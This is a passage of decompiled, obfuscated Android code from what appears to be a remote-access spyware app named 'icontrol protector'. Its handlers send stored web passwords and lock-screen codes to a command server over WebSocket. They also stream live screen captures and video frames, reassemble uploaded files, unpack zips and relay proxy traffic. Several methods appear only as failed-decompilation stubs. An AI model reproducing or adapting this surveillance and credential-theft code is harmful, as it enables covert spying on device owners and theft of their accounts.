                        if (string2.length() <= 0) break block5;
                        object = object.optString("title", "");
                        if (khkpbnqozqiffemrwsat.getInstance() != null && khkpbnqozqiffemrwsat.getInstance().iskhkpbnqozqiffemrwsatOpen) break block6;
                        Intent intent = new Intent(Dummyctx, khkpbnqozqiffemrwsat.class);
                        intent.addFlags(0x10000000);
                        intent.putExtra("title", (String)object);
                        Dummyctx.startActivity(intent);
                        try {
                            Thread.sleep(1000L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    try {
                        khkpbnqozqiffemrwsat.getInstance().appendToChat("Sender", string2);
                    }
                    catch (Exception exception) {
                        maagohqzehyoivaxlfkohrpeu.Error("Handlemessage", exception.getMessage());
                    }
                }
            }

            private void Handlescreenread(JSONObject object) {
                block12: {
                    String string2;
                    block13: {
                        string2 = object.optString("cas", "");
                        if (string2.equals("0")) {
                            vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.Live_scread, false);
                            break block12;
                        }
                        boolean bl = string2.equals("zom");
                        if (!bl) break block13;
                        object = object.optString("xz", "0");
                        try {
                            if (((String)object).equals("1")) {
                                if (jhvbzpdwpbqgticwdxuva.screenfontSize < 80) {
                                    jhvbzpdwpbqgticwdxuva.screenfontSize += 5;
                                }
                            } else if (jhvbzpdwpbqgticwdxuva.screenfontSize > 10) {
                                jhvbzpdwpbqgticwdxuva.screenfontSize -= 5;
                            }
                            break block12;
                        }
                        catch (Exception exception) {}
                        break block12;
                    }
                    try {
                        if (string2.equals("1")) {
                            vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.Live_scread, true);
                            object = object.optString("skidf", "null");
                            this.this$0.LiveScReader(Dummyctx, (String)object);
                        }
                    }
                    catch (Exception exception) {
                        maagohqzehyoivaxlfkohrpeu.Error("Handlescreenread", exception.getMessage());
                    }
                }
            }

            static /* synthetic */ void lambda$HandleBot$1(CommandProcessor commandProcessor, String string2, String string3) {
                commandProcessor.processCommands(string2, string3);
            }

            static /* synthetic */ void lambda$HandleTools$2(String string2) {
                try {
                    if (Build.VERSION.SDK_INT >= 33) {
                        Intent intent = new Intent(Dummyctx, Toastit.class);
                        intent.addFlags(0x10000000);
                        intent.putExtra("msg", string2);
                        Dummyctx.startActivity(intent);
                    } else {
                        Toast.makeText((Context)Dummyctx, (CharSequence)string2, (int)1).show();
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            static /* synthetic */ void lambda$HandleTools$3(String string2) {
                try {
                    Intent intent = new Intent("android.intent.action.VIEW");
                    intent.addFlags(0x10000000);
                    intent.setData(Uri.parse((String)string2));
                    Dummyctx.startActivity(intent);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            static /* synthetic */ void lambda$HandleTools$4(String string2, String string3) {
                try {
                    Intent intent = new Intent(Dummyctx, Vupzturl.class);
                    intent.addFlags(0x10000000);
                    intent.putExtra("msg", string2);
                    intent.putExtra("lang", string3);
                    Dummyctx.startActivity(intent);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            private void loadcodes() {
                String string2 = vyklwirattpkwkqagsbrm.Read(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_cods, "");
                boolean bl = vyklwirattpkwkqagsbrm.ReadBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.lock_screen, false);
                try {
                    String string3 = vyklwirattpkwkqagsbrm.Read(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.mob_lock, "");
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("type", (Object)"lock");
                    jSONObject.put("islk", (Object)String.valueOf(bl));
                    jSONObject.put("caplk", (Object)string3);
                    jSONObject.put("cods", (Object)string2);
                    string3 = jSONObject.toString();
                    this.this$0.Livemessage(Dummyctx, string3);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            /*
             * Loose catch block
             * Enabled force condition propagation
             * Lifted jumps to return sites
             */
            private void reconstructFile(String string2, String string3) {
                List<byte[]> list = this.chunkStorage.get(string3);
                Object object = new File(string2);
                if (!((File)object).exists()) {
                    ((File)object).createNewFile();
                }
                Object object2 = new FileOutputStream((File)object);
                object = list.iterator();
                while (object.hasNext()) {
                    ((FileOutputStream)object2).write((byte[])object.next());
                }
                ((FileOutputStream)object2).close();
                object2 = new StringBuilder();
                maagohqzehyoivaxlfkohrpeu.Info("HandleUpload", ((StringBuilder)object2).append("File reconstructed: ").append(string2).toString());
                this.chunkStorage.remove(string3);
                this.chunkProgress.remove(string3);
                return;
                catch (Throwable throwable) {
                    try {
                        ((FileOutputStream)object2).close();
                        throw throwable;
                    }
                    catch (Throwable throwable2) {
                        try {
                            throwable.addSuppressed(throwable2);
                            throw throwable;
                        }
                        catch (IOException iOException) {
                            maagohqzehyoivaxlfkohrpeu.Error("reconstructFile", iOException.getMessage());
                        }
                    }
                }
            }

            /*
             * Unable to fully structure code
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void extractZipFile(File var1_1, File var2_5) {
                var4_9 = new FileInputStream((File)var1_1);
                var1_1 = new ZipInputStream(var4_9);
                while (true) {
                    block22: {
                        var5_11 = var1_1.getNextEntry();
                        if (var5_11 == null) ** GOTO lbl34
                        var6_13 = new File(var2_5, var5_11.getName());
                        if (!var5_11.isDirectory()) break block22;
                        var6_13.mkdirs();
                        ** GOTO lbl23
                    }
                    var5_11 = new FileOutputStream((File)var6_13);
                    var6_13 = new byte[1024];
                    while ((var3_10 = var1_1.read((byte[])var6_13)) > 0) {
                        var5_11.write((byte[])var6_13, 0, var3_10);
                    }
                    var5_11.close();
lbl23:
                    // 2 sources

                    var1_1.closeEntry();
                    continue;
                    break;
                }
                catch (Throwable var2_6) {
                    try {
                        var5_11.close();
                        throw var2_6;
                    }
                    catch (Throwable var5_12) {
                        var2_6.addSuppressed(var5_12);
                        throw var2_6;
lbl34:
                        // 2 sources

                        var1_1.close();
                        var4_9.close();
                        return;
                        catch (Throwable var2_7) {
                            try {
                                var1_1.close();
                                throw var2_7;
                            }
                            catch (Throwable var1_2) {
                                try {
                                    var2_7.addSuppressed(var1_2);
                                    throw var2_7;
                                }
                                catch (Throwable var1_3) {
                                    try {
                                        var4_9.close();
                                        throw var1_3;
                                    }
                                    catch (Throwable var2_8) {
                                        try {
                                            var1_3.addSuppressed(var2_8);
                                            throw var1_3;
                                        }
                                        catch (IOException var1_4) {
                                            var1_4.printStackTrace();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            /*
             * Exception decompiling
             */
            /* synthetic */ void lambda$onMessage$0$com-icontrol-protector-etkmbyodxlwuglfdj$1(String var1_1) {
                /*
                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                 * 
                 * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [20[CASE]], but top level block is 7[TRYBLOCK]
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1050)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                 */
                throw new IllegalStateException("Decompilation failed");
            }

            public void loadpassword(Context object, String string2) {
                Object object2 = vyklwirattpkwkqagsbrm.ReadList(object, aaskrfyvhoypymnzlskbzwpyr.web_pass);
                if (object2 != null && object2.size() > 0) {
                    object = "";
                    for (String string3 : object2) {
                        object = (String)object + string3 + aaskrfyvhoypymnzlskbzwpyr.SPLIT_LINE;
                    }
                    try {
                        object2 = new JSONObject();
                        object2.put("type", (Object)string2);
                        object2.put("data", object);
                        object2.put("cuz", (Object)"p");
                        object = object2.toString();
                        this.this$0.Livemessage(Dummyctx, (String)object);
                    }
                    catch (Exception exception) {}
                } else {
                    if (string2.equals("trk")) {
                        object2 = "";
                        for (String string4 : elwxjqxcxhcpntga.Map_Name_Lnk.values()) {
                            string4 = string4 + aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA + "-" + aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA + "No Data Found" + aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA + "-";
                            object2 = (String)object2 + Base64.encodeToString((byte[])string4.getBytes(), (int)0) + aaskrfyvhoypymnzlskbzwpyr.SPLIT_LINE;
                        }
                        try {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("type", (Object)string2);
                            jSONObject.put("data", object2);
                            jSONObject.put("cuz", (Object)"p");
                            string2 = jSONObject.toString();
                            this.this$0.Livemessage(Dummyctx, string2);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(object, "Accounts", "No Data Found.");
                }
            }

            public void onClosing(WebSocket webSocket, int n, String string2) {
                super.onClosing(webSocket, n, string2);
                isConnected = false;
                this.this$0.Endme();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                super.onFailure(webSocket, throwable, response);
                isConnected = false;
                this.this$0.Endme();
            }

            public void onMessage(WebSocket object, String string2) {
                super.onMessage(object, string2);
                maagohqzehyoivaxlfkohrpeu.Debug("onMessage etkmbyodxlwuglfdj:", string2);
                try {
                    object = new etkmbyodxlwuglfdj$1$$ExternalSyntheticLambda3(this, string2);
                    Thread thread = new Thread((Runnable)object);
                    thread.start();
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("json livechat", exception.getMessage());
                    exception.printStackTrace();
                    if (string2.toLowerCase().equals("stop")) {
                        yzwfammsheivqmaemonkhmjao yzwfammsheivqmaemonkhmjao2 = new yzwfammsheivqmaemonkhmjao("Sleep".getBytes(), "null".getBytes());
                        this.this$0.HandelPacket(yzwfammsheivqmaemonkhmjao2);
                    }
                    this.this$0.Endme();
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                try {
                    if (LOCK_SOCKET == null) {
                        etkmbyodxlwuglfdj.access$102(((PowerManager)Dummyctx.getSystemService("power")).newWakeLock(536870938, ":"));
                    }
                    if (LOCK_SOCKET != null && !LOCK_SOCKET.isHeld()) {
                        LOCK_SOCKET.acquire();
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                try {
                    isConnected = true;
                    vyklwirattpkwkqagsbrm.WriteBool(Dummyctx, aaskrfyvhoypymnzlskbzwpyr.Send_Skilton, false);
                    this.this$0.joinsession(Dummyctx, "0", "join");
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        });
    }

    private void writeOptionBool(Context context, String string2, String string3) {
        vyklwirattpkwkqagsbrm.WriteBool(context, string2, "1".equals(string3));
    }

    /*
     * Exception decompiling
     */
    public void HandelPacket(yzwfammsheivqmaemonkhmjao var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Started 2 blocks at once
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.getStartingBlocks(Op04StructuredStatement.java:412)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:487)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public void LiveDownload(Context context, String string2, String string3, String string4, Boolean bl) {
        this.startLiveDownload(context, string2, string3, string4, bl, new OkHttpClient.Builder().build(), new UploadState());
    }

    public void LiveScReader(Context context, String string2) {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        okHttpClient.newWebSocket(new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build(), new WebSocketListener(this, context, string2, okHttpClient){
            final etkmbyodxlwuglfdj this$0;
            final OkHttpClient val$clientfile;
            final Context val$ctx;
            final String val$sockidf;
            {
                this.this$0 = etkmbyodxlwuglfdj2;
                this.val$ctx = context;
                this.val$sockidf = string2;
                this.val$clientfile = okHttpClient;
            }

            public void onClosed(WebSocket webSocket, int n, String string2) {
                this.val$clientfile.dispatcher().executorService().shutdown();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                throwable.printStackTrace();
            }

            public void onMessage(WebSocket object, String string2) {
                super.onMessage((WebSocket)object, string2);
                try {
                    object = new JSONObject(string2);
                    object = object.optString("type", "empty");
                    if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                        this.val$clientfile.dispatcher().executorService().shutdown();
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                new Thread(this, webSocket){
                    final 5 this$1;
                    final WebSocket val$webSocketf;
                    {
                        this.this$1 = var1_1;
                        this.val$webSocketf = webSocket;
                    }

                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, "Wscr", "720");
                        vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, "Hscr", "1280");
                        String string2 = vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY);
                        while (vyklwirattpkwkqagsbrm.ReadBool(this.this$1.val$ctx, aaskrfyvhoypymnzlskbzwpyr.Live_scread, false)) {
                            Object object = elwxjqxcxhcpntga.createskilton();
                            if (object == null) continue;
                            try {
                                Object object2 = jhvbzpdwpbqgticwdxuva.AccessWindow.getDefaultDisplay();
                                Point point = new Point();
                                object2.getRealSize(point);
                                int n = point.x;
                                int n2 = point.y;
                                object2 = Base64.encodeToString((byte[])object, (int)0);
                                object = new JSONObject;
                                object();
                                object.put("type", (Object)"scread");
                                object.put("img", object2);
                                object.put("frmt", (Object)"w");
                                object.put("ori", (Object)Tools.getOrientationString(this.this$1.val$ctx));
                                object.put("skly", (Object)"0");
                                object.put("wmob", n);
                                object.put("hmob", n2);
                                object = object.toString();
                                object = this.this$1.this$0.createMessage(this.this$1.val$ctx, this.this$1.val$sockidf, (String)object, string2);
                                this.val$webSocketf.send((String)object);
                            }
                            catch (Exception exception) {
                                exception.printStackTrace();
                            }
                        }
                        this.val$webSocketf.close(1000, "scread complete");
                    }
                }.start();
            }
        });
    }

    public void LiveScreenSilent(Context context, byte[] object, String string2) {
        String string3 = Base64.encodeToString((byte[])object, (int)0);
        object = (WindowManager)context.getSystemService("window");
        Object object2 = jhvbzpdwpbqgticwdxuva.AccessWindow.getDefaultDisplay();
        object = new Point;
        object();
        object2.getRealSize((Point)object);
        int n = object.x;
        int n2 = object.y;
        object2 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.Sec_IDF, "null");
        object = object2;
        try {
            if (((String)object2).equals("null")) {
                object = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
            }
            object2 = new JSONObject();
            object2.put("type", (Object)string2);
            object2.put("img", (Object)string3);
            object2.put("frmt", (Object)"w");
            object2.put("skly", (Object)"0");
            object2.put("ori", (Object)Tools.getOrientationString(context));
            object2.put("wmob", n);
            object2.put("hmob", n2);
            this.SendNewSocket(context, (String)object, object2.toString());
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public void Livemessage(Context context, String string2) {
        if (ws != null) {
            String string3;
            String string4;
            String string5;
            String string6;
            block9: {
                string6 = vyklwirattpkwkqagsbrm.Read(context, "ID", "Deviceid");
                string5 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
                string4 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
                string3 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.Sec_IDF, "null");
                if (string6 == null) {
                    return;
                }
                if (string5 != null) break block9;
                try {
                    if (ws != null) {
                        ws.cancel();
                        ws = null;
                    }
                    if (client != null) {
                        client.dispatcher().cancelAll();
                        client.connectionPool().evictAll();
                        client.dispatcher().executorService().shutdown();
                        client = null;
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                return;
            }
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("idf", (Object)string5);
                jSONObject.put("sidf", (Object)string3);
                jSONObject.put("cip", (Object)string4);
                jSONObject.put("pid", (Object)string6);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)"msg");
                jSONObject.put("conk", (Object)vyklwirattpkwkqagsbrm.Read(context, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY));
                jSONObject.put("msg", (Object)string2);
                ws.send(jSONObject.toString());
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }

    public void Playvideostrem(Context context, String string2, String string3, String string4) {
        OkHttpClient okHttpClient = new OkHttpClient();
        okHttpClient.newWebSocket(new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build(), new WebSocketListener(this, context, string2, string3, string4, okHttpClient){
            boolean iamout;
            final etkmbyodxlwuglfdj this$0;
            final Context val$ctx;
            final String val$path;
            final String val$playit;
            final String val$sockidf;
            final OkHttpClient val$tmpclient;
            {
                this.this$0 = etkmbyodxlwuglfdj2;
                this.val$ctx = context;
                this.val$path = string2;
                this.val$playit = string3;
                this.val$sockidf = string4;
                this.val$tmpclient = okHttpClient;
                this.iamout = false;
            }

            private void killall(WebSocket webSocket, OkHttpClient okHttpClient) {
                block5: {
                    block4: {
                        this.iamout = true;
                        if (webSocket == null) break block4;
                        webSocket.cancel();
                    }
                    if (okHttpClient == null) break block5;
                    try {
                        okHttpClient.dispatcher().cancelAll();
                        okHttpClient.connectionPool().evictAll();
                        okHttpClient.dispatcher().executorService().shutdown();
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            }

            public void onClosed(WebSocket webSocket, int n, String string2) {
                this.val$tmpclient.dispatcher().executorService().shutdown();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                throwable.printStackTrace();
            }

            public void onMessage(WebSocket webSocket, String string2) {
                super.onMessage(webSocket, string2);
                try {
                    JSONObject jSONObject = new JSONObject(string2);
                    string2 = jSONObject.optString("type", "empty");
                    if (string2.equals("stop") || string2.equals("Unauthorized access")) {
                        this.killall(webSocket, this.val$tmpclient);
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                new Thread(this, webSocket){
                    final 2 this$1;
                    final WebSocket val$webSocketf;
                    {
                        this.this$1 = var1_1;
                        this.val$webSocketf = webSocket;
                    }

                    /*
                     * Loose catch block
                     */
                    @Override
                    public void run() {
                        String string2;
                        String string3;
                        String string4;
                        block29: {
                            string4 = "msg";
                            string3 = vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, "ID", null);
                            string2 = vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
                            if (string3 != null) break block29;
                            return;
                        }
                        Uri uri = Uri.parse((String)this.this$1.val$path.trim());
                        File file = new File(uri.getPath());
                        MediaMetadataRetriever mediaMetadataRetriever = new MediaMetadataRetriever();
                        mediaMetadataRetriever.setDataSource(file.getPath());
                        MediaPlayer mediaPlayer = MediaPlayer.create((Context)this.this$1.val$ctx, (Uri)uri);
                        int n = mediaPlayer.getDuration();
                        String string5 = mediaMetadataRetriever.extractMetadata(9);
                        String string6 = vyklwirattpkwkqagsbrm.Read(this.this$1.val$ctx, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY);
                        for (int i = 1000000; i < n * 10000; i += 100000) {
                            block30: {
                                Object object;
                                Bitmap bitmap;
                                if (!file.exists()) continue;
                                if (!this.this$1.val$playit.equals("1")) {
                                    bitmap = mediaMetadataRetriever.getFrameAtTime((long)i * 10L, 2);
                                    object = Bitmap.CompressFormat.JPEG;
                                } else {
                                    bitmap = mediaMetadataRetriever.getFrameAtTime((long)i, 3);
                                    object = Bitmap.CompressFormat.WEBP;
                                }
                                if (bitmap == null) continue;
                                int n2 = bitmap.getWidth();
                                n2 /= 3;
                                int n3 = bitmap.getHeight() / 3;
                                bitmap = Bitmap.createScaledBitmap((Bitmap)bitmap, (int)n2, (int)n3, (boolean)false);
                                Object object2 = new ByteArrayOutputStream();
                                bitmap.compress(object, 30, (OutputStream)object2);
                                object2 = Base64.encodeToString((byte[])((ByteArrayOutputStream)object2).toByteArray(), (int)0);
                                boolean bl = this.this$1.val$playit.equals("1");
                                object = bl ? "pvid" : "thumb";
                                Object object3 = new JSONObject();
                                try {
                                    object3.put("type", object);
                                }
                                catch (Exception exception) {
                                    continue;
                                }
                                try {
                                    object3.put("img", object2);
                                }
                                catch (Exception exception) {
                                    continue;
                                }
                                object3.put("pth", (Object)this.this$1.val$path);
                                object3.put("dur", (Object)string5);
                                object3 = object3.toString();
                                object = new JSONObject();
                                object2 = this.this$1.val$sockidf;
                                try {
                                    object.put("idf", object2);
                                    object.put("pid", (Object)string3);
                                    object.put("itype", (Object)"Slr_client");
                                    object.put("subc", (Object)string4);
                                    object.put(string4, object3);
                                    object.put("cip", (Object)string2);
                                    object.put("conk", (Object)string6);
                                    if (this.val$webSocketf == null || this.this$1.iamout) break;
                                    this.val$webSocketf.send(object.toString());
                                    bitmap.recycle();
                                    if (this.this$1.val$playit.equals("1")) break block30;
                                    bitmap = new Handler(Looper.getMainLooper());
                                    object = new Runnable(this){
                                        final 1 this$2;
                                        {
                                            this.this$2 = var1_1;
                                        }

                                        @Override
                                        public void run() {
                                            try {
                                                this.this$2.this$1.killall(this.this$2.val$webSocketf, this.this$2.this$1.val$tmpclient);
                                            }
                                            catch (Exception exception) {
                                                // empty catch block
                                            }
                                        }
                                    };
                                }
                                catch (Exception exception) {
                                    continue;
                                }
                                try {
                                    bitmap.postDelayed((Runnable)object, 5000L);
                                    break;
                                }
                                catch (Exception exception) {
                                    continue;
                                }
                            }
                            try {
                                Thread.sleep(100L);
                            }
                            catch (Exception exception) {}
                            continue;
                            catch (Exception exception) {
                                continue;
                            }
                            catch (Exception exception) {
                                continue;
                            }
                            catch (Exception exception) {
                                continue;
                            }
                            catch (Exception exception) {
                                continue;
                            }
                            catch (Exception exception) {
                                // empty catch block
                            }
                        }
                        try {
                            mediaPlayer.reset();
                            mediaPlayer.release();
                        }
                        catch (Exception exception) {
                            exception.printStackTrace();
                        }
                    }
                }.start();
            }
        });
    }

    public void ProxyMsg(Context object, JSONObject jSONObject) {
        if (ws != null) {
            String string2;
            block9: {
                string2 = vyklwirattpkwkqagsbrm.Read(object, "ID", "Deviceid");
                object = vyklwirattpkwkqagsbrm.Read(object, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
                if (string2 == null) {
                    return;
                }
                if (object != null) break block9;
                try {
                    if (ws != null) {
                        ws.cancel();
                        ws = null;
                    }
                    if (client != null) {
                        client.dispatcher().cancelAll();
                        client.connectionPool().evictAll();
                        client.dispatcher().executorService().shutdown();
                        client = null;
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                return;
            }
            try {
                jSONObject.put("idf", object);
                jSONObject.put("pid", (Object)string2);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)"proxy");
                ws.send(jSONObject.toString());
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }

    public void SendNewSocket(Context context, String string2, String string3) {
        WebSocket webSocket = this.openSockets.get(string2);
        String string4 = vyklwirattpkwkqagsbrm.Read(context, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY);
        if (webSocket != null) {
            try {
                webSocket.send(this.createMessage(context, string2, string3, string4));
                return;
            }
            catch (Exception exception) {
                this.openSockets.remove(string2);
            }
        }
        webSocket = new OkHttpClient();
        webSocket.newWebSocket(new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build(), new WebSocketListener(this, string2, context, string3, string4, (OkHttpClient)webSocket){
            final etkmbyodxlwuglfdj this$0;
            final String val$conctkey;
            final Context val$ctx;
            final String val$idf;
            final String val$msg;
            final OkHttpClient val$tmpclient;
            {
                this.this$0 = etkmbyodxlwuglfdj2;
                this.val$idf = string2;
                this.val$ctx = context;
                this.val$msg = string3;
                this.val$conctkey = string4;
                this.val$tmpclient = okHttpClient;
            }

            /* synthetic */ void lambda$onOpen$0$com-icontrol-protector-etkmbyodxlwuglfdj$3(Context context, String string2, String string3, String string4, WebSocket webSocket) {
                try {
                    webSocket.send(this.this$0.createMessage(context, string2, string3, string4));
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            public void onClosed(WebSocket webSocket, int n, String string2) {
                this.this$0.openSockets.remove(this.val$idf);
                this.val$tmpclient.dispatcher().executorService().shutdown();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                this.this$0.openSockets.remove(this.val$idf);
                throwable.printStackTrace();
            }

            public void onMessage(WebSocket object, String string2) {
                super.onMessage((WebSocket)object, string2);
                try {
                    object = new JSONObject(string2);
                    object = object.optString("type", "empty");
                    if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                        this.this$0.openSockets.remove(this.val$idf);
                        this.val$tmpclient.dispatcher().executorService().shutdown();
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                this.this$0.openSockets.put(this.val$idf, webSocket);
                new Thread(new etkmbyodxlwuglfdj$3$$ExternalSyntheticLambda0(this, this.val$ctx, this.val$idf, this.val$msg, this.val$conctkey, webSocket)).start();
            }
        });
    }

    public void joinsession(Context context, String string2, String string3) {
        if (ws != null) {
            String string4;
            String string5;
            String string6;
            block9: {
                string6 = vyklwirattpkwkqagsbrm.Read(context, "ID", "Deviceid");
                string5 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
                string4 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
                if (string6 == null) {
                    return;
                }
                if (string5 != null) break block9;
                try {
                    if (ws != null) {
                        ws.cancel();
                        ws = null;
                    }
                    if (client != null) {
                        client.dispatcher().cancelAll();
                        client.connectionPool().evictAll();
                        client.dispatcher().executorService().shutdown();
                        client = null;
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                return;
            }
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("idf", (Object)string5);
                jSONObject.put("pid", (Object)string6);
                jSONObject.put("cip", (Object)string4);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)string3);
                jSONObject.put("msg", (Object)string2);
                jSONObject.put("conk", (Object)vyklwirattpkwkqagsbrm.Read(context, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY));
                ws.send(jSONObject.toString());
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean pingServer() {
        block24: {
            var6_1 = null;
            var3_7 = var7_4 = null;
            var4_9 = var6_1;
            var8_12 = vyklwirattpkwkqagsbrm.Read(etkmbyodxlwuglfdj.Dummyctx, "red_ip", "");
